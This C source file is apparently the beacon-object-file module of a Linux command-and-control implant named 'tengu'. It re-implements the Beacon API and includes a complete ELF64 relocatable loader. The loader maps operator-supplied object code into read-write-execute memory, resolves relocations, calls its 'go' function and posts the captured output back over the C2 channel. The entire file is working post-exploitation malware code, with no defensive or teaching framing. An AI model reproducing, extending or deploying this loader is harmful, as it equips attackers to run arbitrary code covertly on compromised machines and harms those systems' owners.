#define _GNU_SOURCE
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <elf.h>
#include <dlfcn.h>
#include <sys/mman.h>

#include "tengu.h"

/* ------------------------------------------------------------------ */
/* BOF output buffer                                                   */
/* ------------------------------------------------------------------ */

static char*  g_bof_out     = NULL;
static size_t g_bof_out_len = 0;
static size_t g_bof_out_cap = 0;

static void bof_out_reset(void) {
    g_bof_out_len = 0;
    if (g_bof_out) g_bof_out[0] = '\0';
}

static void bof_out_append(const char* data, size_t len) {
    if (g_bof_out_len + len + 1 > g_bof_out_cap) {
        size_t new_cap = (g_bof_out_len + len + 256) * 2;
        g_bof_out = realloc(g_bof_out, new_cap);
        if (!g_bof_out) { g_bof_out_cap = 0; g_bof_out_len = 0; return; }
        g_bof_out_cap = new_cap;
    }
    memcpy(g_bof_out + g_bof_out_len, data, len);
    g_bof_out_len += len;
    g_bof_out[g_bof_out_len] = '\0';
}

/* ------------------------------------------------------------------ */
/* BeaconAPI                                                           */
/*                                                                     */
/* Arg buffer format (packed by teamserver, read here):               */
/*   per arg: [type:2B LE][len:4B LE][data]                           */
/*   types: 0=short, 1=int, 2=str(nul-terminated), 8=binary          */
/* ------------------------------------------------------------------ */

#define CALLBACK_OUTPUT 0x0
#define CALLBACK_ERROR  0x0d

typedef struct {
    char* original;
    char* buffer;
    int   length;
    int   size;
} datap;

typedef struct {
    char* output;
    int   length;
    int   allocated;
} formatp;

void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer;
    parser->length   = size;
    parser->size     = size;
}

int BeaconDataInt(datap* parser) {
    if (!parser || parser->length < 4) return 0;
    int32_t v;
    memcpy(&v, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return (int)v;
}

short BeaconDataShort(datap* parser) {
    if (!parser || parser->length < 2) return 0;
    int16_t v;
    memcpy(&v, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return (short)v;
}

int BeaconDataLength(datap* parser) {
    return parser ? parser->length : 0;
}

char* BeaconDataExtract(datap* parser, int* size) {
    if (!parser || parser->length < 4) return NULL;
    uint32_t len;
    memcpy(&len, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    if ((int)len > parser->length) return NULL;
    char* ptr = parser->buffer;
    parser->buffer += (int)len;
    parser->length -= (int)len;
    if (size) *size = (int)len;
    return ptr;
}

void BeaconOutput(int type, char* data, int len) {
    (void)type;
    if (data && len > 0)
        bof_out_append(data, (size_t)len);
}

void BeaconPrintf(int type, const char* fmt, ...) {
    (void)type;
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0)
        bof_out_append(tmp, (size_t)n < sizeof(tmp) ? (size_t)n : sizeof(tmp) - 1);
}

void BeaconFormatAlloc(formatp* format, int maxsz) {
    if (!format || maxsz <= 0) return;
    format->output    = calloc(1, (size_t)maxsz);
    format->length    = 0;
    format->allocated = format->output ? maxsz : 0;
}

void BeaconFormatFree(formatp* format) {
    if (!format) return;
    free(format->output);
    format->output    = NULL;
    format->length    = 0;
    format->allocated = 0;
}

void BeaconFormatReset(formatp* format) {
    if (!format || !format->output) return;
    format->length    = 0;
    format->output[0] = '\0';
}

void BeaconFormatAppend(formatp* format, char* text, int len) {
    if (!format || !format->output || len <= 0) return;
    int rem = format->allocated - format->length - 1;
    if (rem <= 0) return;
    int n = len < rem ? len : rem;
    memcpy(format->output + format->length, text, (size_t)n);
    format->length += n;
    format->output[format->length] = '\0';
}

void BeaconFormatPrintf(formatp* format, const char* fmt, ...) {
    if (!format || !format->output) return;
    int rem = format->allocated - format->length - 1;
    if (rem <= 0) return;
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(format->output + format->length, (size_t)rem, fmt, ap);
    va_end(ap);
    if (n > 0) format->length += n < rem ? n : rem;
}

void BeaconFormatToOutput(int type, formatp* format) {
    if (!format || !format->output || format->length <= 0) return;
    BeaconOutput(type, format->output, format->length);
}

char* BeaconFormatOriginalPtr(formatp* format) {
    return format ? format->output : NULL;
}

int BeaconIsAdmin(void) {
    return (geteuid() == 0) ? 1 : 0;
}

/* ------------------------------------------------------------------ */
/* BeaconAPI symbol table for symbol resolution                        */
/* ------------------------------------------------------------------ */

typedef struct { const char* name; void* fn; } BofApiSym;

static const BofApiSym k_beacon_api[] = {
    { "BeaconDataParse",         (void*)BeaconDataParse         },
    { "BeaconDataInt",           (void*)BeaconDataInt           },
    { "BeaconDataShort",         (void*)BeaconDataShort         },
    { "BeaconDataLength",        (void*)BeaconDataLength        },
    { "BeaconDataExtract",       (void*)BeaconDataExtract       },
    { "BeaconOutput",            (void*)BeaconOutput            },
    { "BeaconPrintf",            (void*)BeaconPrintf            },
    { "BeaconFormatAlloc",       (void*)BeaconFormatAlloc       },
    { "BeaconFormatFree",        (void*)BeaconFormatFree        },
    { "BeaconFormatReset",       (void*)BeaconFormatReset       },
    { "BeaconFormatAppend",      (void*)BeaconFormatAppend      },
    { "BeaconFormatPrintf",      (void*)BeaconFormatPrintf      },
    { "BeaconFormatToOutput",    (void*)BeaconFormatToOutput    },
    { "BeaconFormatOriginalPtr", (void*)BeaconFormatOriginalPtr },
    { "BeaconIsAdmin",           (void*)BeaconIsAdmin           },
    { NULL, NULL },
};

static void* resolve_sym(const char* name) {
    for (int i = 0; k_beacon_api[i].name; i++) {
        if (strcmp(name, k_beacon_api[i].name) == 0)
            return k_beacon_api[i].fn;
    }
    return dlsym(RTLD_DEFAULT, name);
}

/* ------------------------------------------------------------------ */
/* x86_64 relocation types                                             */
/* ------------------------------------------------------------------ */

#define R_X86_64_NONE          0
#define R_X86_64_64            1
#define R_X86_64_PC32          2
#define R_X86_64_PLT32         4
#define R_X86_64_32            10
#define R_X86_64_32S           11
#define R_X86_64_GOTPCREL      9
#define R_X86_64_GOTPCRELX     41
#define R_X86_64_REX_GOTPCRELX 42

/* ------------------------------------------------------------------ */
/* ELF64 loader                                                        */
/* ------------------------------------------------------------------ */

#define MAX_GOT_ENTRIES  512
#define MAX_TRAMPOLINES  256
#define GOT_AREA_SIZE    (MAX_GOT_ENTRIES  * sizeof(uint64_t))
/* mov rax, imm64 (10B) + jmp rax (2B) = 12 bytes per trampoline */
#define TRAMP_SIZE       12
#define TRAMP_AREA_SIZE  (MAX_TRAMPOLINES * TRAMP_SIZE)

typedef struct {
    uint8_t** sec_mem;     /* pointer into the single mapping per section */
    int       nsec;
    uint8_t*  map_base;    /* single contiguous RWX mapping */
    size_t    map_size;
    uint64_t* got;         /* GOT area (8-byte slots) */
    int       got_count;
    uint8_t*  trampolines; /* trampoline stubs for out-of-range calls */
    int       tramp_count;
} BofCtx;

static uint64_t* got_slot(BofCtx* ctx, uint64_t sym_addr) {
    if (ctx->got_count >= MAX_GOT_ENTRIES) return NULL;
    ctx->got[ctx->got_count] = sym_addr;
    return &ctx->got[ctx->got_count++];
}

/* Returns address of a trampoline that does: mov rax, sym_addr; jmp rax */
static uint8_t* make_trampoline(BofCtx* ctx, uint64_t sym_addr) {
    if (ctx->tramp_count >= MAX_TRAMPOLINES) return NULL;
    uint8_t* t = ctx->trampolines + ctx->tramp_count * TRAMP_SIZE;
    ctx->tramp_count++;
    /* 48 B8 <imm64>   mov rax, imm64 */
    t[0] = 0x48; t[1] = 0xB8;
    memcpy(t + 2, &sym_addr, 8);
    /* FF E0            jmp rax */
    t[10] = 0xFF; t[11] = 0xE0;
    return t;
}

static int bof_run(const uint8_t* data, size_t len, char* args, int args_len) {
    if (len < sizeof(Elf64_Ehdr)) return -1;

    const Elf64_Ehdr* ehdr = (const Elf64_Ehdr*)data;

    if (ehdr->e_ident[EI_MAG0] != ELFMAG0 || ehdr->e_ident[EI_MAG1] != ELFMAG1 ||
        ehdr->e_ident[EI_MAG2] != ELFMAG2 || ehdr->e_ident[EI_MAG3] != ELFMAG3)
        return -1;
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) return -1;
    if (ehdr->e_machine != EM_X86_64)          return -1;
    if (ehdr->e_type    != ET_REL)             return -1;

    int nsec = (int)ehdr->e_shnum;
    if (nsec == 0) return -1;

    const Elf64_Shdr* shdrs = (const Elf64_Shdr*)(data + ehdr->e_shoff);
    const char* shstrtab = (const char*)(data + shdrs[ehdr->e_shstrndx].sh_offset);
    (void)shstrtab;

    BofCtx ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.nsec    = nsec;
    ctx.sec_mem = calloc((size_t)nsec, sizeof(uint8_t*));
    if (!ctx.sec_mem) goto fail;

    /* Pass 1: compute total contiguous size for all allocatable sections + GOT */
    size_t total_sz = 0;
    size_t* sec_off = calloc((size_t)nsec, sizeof(size_t));
    if (!sec_off) goto fail;

    for (int i = 0; i < nsec; i++) {
        const Elf64_Shdr* sh = &shdrs[i];
        if (!(sh->sh_flags & SHF_ALLOC)) continue;
        size_t align = sh->sh_addralign > 1 ? sh->sh_addralign : 1;
        total_sz = (total_sz + align - 1) & ~(align - 1);
        sec_off[i] = total_sz;
        total_sz += sh->sh_size ? sh->sh_size : 8;
    }
    /* Reserve GOT + trampoline areas at the end, 8-byte aligned */
    total_sz = (total_sz + 7) & ~(size_t)7;
    size_t got_offset   = total_sz;
    total_sz += GOT_AREA_SIZE;
    size_t tramp_offset = total_sz;
    total_sz += TRAMP_AREA_SIZE;

    /* Single RWX mapping - all sections + GOT + trampolines in one block.
     * This guarantees every PC32/PLT32 relocation between sections is in range,
     * and trampolines can reach any far symbol via 64-bit absolute jump. */
    ctx.map_base = mmap(NULL, total_sz, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (ctx.map_base == MAP_FAILED) { ctx.map_base = NULL; free(sec_off); goto fail; }
    ctx.map_size     = total_sz;
    ctx.got          = (uint64_t*)(ctx.map_base + got_offset);
    ctx.trampolines  = ctx.map_base + tramp_offset;

    /* Pass 2: set section pointers and copy content */
    for (int i = 0; i < nsec; i++) {
        const Elf64_Shdr* sh = &shdrs[i];
        if (!(sh->sh_flags & SHF_ALLOC)) continue;

        ctx.sec_mem[i] = ctx.map_base + sec_off[i];

        if (sh->sh_type == SHT_PROGBITS) {
            if (sh->sh_offset + sh->sh_size <= len)
                memcpy(ctx.sec_mem[i], data + sh->sh_offset, sh->sh_size);
        }
        /* SHT_NOBITS (.bss) stays zero (MAP_ANONYMOUS zeroes) */
    }
    free(sec_off);

    /* Locate .symtab and its string table */
    const Elf64_Sym* symtab   = NULL;
    int              sym_count = 0;
    const char*      strtab   = NULL;

    for (int i = 0; i < nsec; i++) {
        const Elf64_Shdr* sh = &shdrs[i];
        if (sh->sh_type == SHT_SYMTAB) {
            symtab    = (const Elf64_Sym*)(data + sh->sh_offset);
            sym_count = (int)(sh->sh_size / sizeof(Elf64_Sym));
            strtab    = (const char*)(data + shdrs[sh->sh_link].sh_offset);
        }
    }

    /* Pass 2: apply RELA relocations */
    for (int i = 0; i < nsec; i++) {
        const Elf64_Shdr* sh = &shdrs[i];
        if (sh->sh_type != SHT_RELA) continue;

        int target_sec = (int)sh->sh_info;
        if (target_sec >= nsec || !ctx.sec_mem[target_sec]) continue;

        const Elf64_Rela* relas = (const Elf64_Rela*)(data + sh->sh_offset);
        int               nrela = (int)(sh->sh_size / sizeof(Elf64_Rela));

        for (int j = 0; j < nrela; j++) {
            const Elf64_Rela* r       = &relas[j];
            uint32_t          sym_idx = (uint32_t)(ELF64_R_SYM(r->r_info));
            uint32_t          rtype   = (uint32_t)(ELF64_R_TYPE(r->r_info));

            uint8_t* P   = ctx.sec_mem[target_sec] + r->r_offset;
            uint64_t loc = (uint64_t)(uintptr_t)P;
            int64_t  A   = r->r_addend;

            /* Resolve symbol address S */
            uint64_t S = 0;
            if (symtab && sym_idx < (uint32_t)sym_count) {
                const Elf64_Sym* sym = &symtab[sym_idx];
                uint16_t shndx = sym->st_shndx;

                if (shndx == SHN_UNDEF) {
                    void* fn = resolve_sym(strtab + sym->st_name);
                    S = (uint64_t)(uintptr_t)fn;
                } else if (shndx < (uint16_t)nsec && ctx.sec_mem[shndx]) {
                    S = (uint64_t)(uintptr_t)(ctx.sec_mem[shndx] + sym->st_value);
                }
            }

            switch (rtype) {
            case R_X86_64_NONE:
                break;

            case R_X86_64_64: {
                uint64_t v = S + (uint64_t)A;
                memcpy(P, &v, 8);
                break;
            }

            case R_X86_64_PC32:
            case R_X86_64_PLT32: {
                uint64_t target = S + (uint64_t)A;
                int64_t  delta  = (int64_t)(target - loc);
                if (delta < (int64_t)INT32_MIN || delta > (int64_t)INT32_MAX) {
                    /* Target is out of 32-bit range (e.g. PIE binary vs mmap).
                     * Create a trampoline stub inside our mapping that does
                     * 'mov rax, S; jmp rax' and call that instead. */
                    uint8_t* tramp = make_trampoline(&ctx, S);
                    if (tramp) {
                        target = (uint64_t)(uintptr_t)tramp + (uint64_t)A;
                        delta  = (int64_t)(target - loc);
                    }
                }
                int32_t v32 = (int32_t)delta;
                memcpy(P, &v32, 4);
                break;
            }

            case R_X86_64_32: {
                uint32_t v = (uint32_t)(S + (uint64_t)A);
                memcpy(P, &v, 4);
                break;
            }

            case R_X86_64_32S: {
                int32_t v = (int32_t)((int64_t)(S + (uint64_t)A));
                memcpy(P, &v, 4);
                break;
            }

            case R_X86_64_GOTPCREL:
            case R_X86_64_GOTPCRELX:
            case R_X86_64_REX_GOTPCRELX: {
                /* Allocate a GOT slot holding the symbol address */
                uint64_t* slot = got_slot(&ctx, S);
                if (!slot) break;
                int64_t  v = (int64_t)((uint64_t)(uintptr_t)slot + (uint64_t)A - loc);
                int32_t  v32 = (int32_t)v;
                memcpy(P, &v32, 4);
                break;
            }

            default:
                break;
            }
        }
    }

    /* Find and call go(char* args, int args_len) */
    void* entry = NULL;
    if (symtab && strtab) {
        for (int i = 0; i < sym_count; i++) {
            const Elf64_Sym* sym = &symtab[i];
            if (sym->st_shndx == SHN_UNDEF) continue;
            uint16_t shndx = sym->st_shndx;
            if (shndx >= (uint16_t)nsec || !ctx.sec_mem[shndx]) continue;
            if (strcmp(strtab + sym->st_name, "go") == 0) {
                entry = ctx.sec_mem[shndx] + sym->st_value;
                break;
            }
        }
    }

    int ret = -1;
    if (entry) {
        typedef void (*go_fn)(char*, int);
        ((go_fn)entry)(args, args_len);
        ret = 0;
    }

fail:
    if (ctx.map_base) munmap(ctx.map_base, ctx.map_size);
    free(ctx.sec_mem);
    return ret;
}

/* ------------------------------------------------------------------ */
/* Command entry point (called from main.c dispatch)                   */
/* ------------------------------------------------------------------ */

void cmd_bof(uint32_t req_id, const uint8_t* elf_data, size_t elf_len,
             char* args, int args_len) {
    bof_out_reset();

    int r = bof_run(elf_data, elf_len, args, args_len);

    const char* out;
    if (r != 0)
        out = "[bof] failed to load ELF object (invalid format or missing 'go' symbol)";
    else if (g_bof_out && g_bof_out_len > 0)
        out = g_bof_out;
    else
        out = "[bof] executed (no output)";

    Buf* pkt = build_output_packet(req_id, COMMAND_OUTPUT, out);
    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}
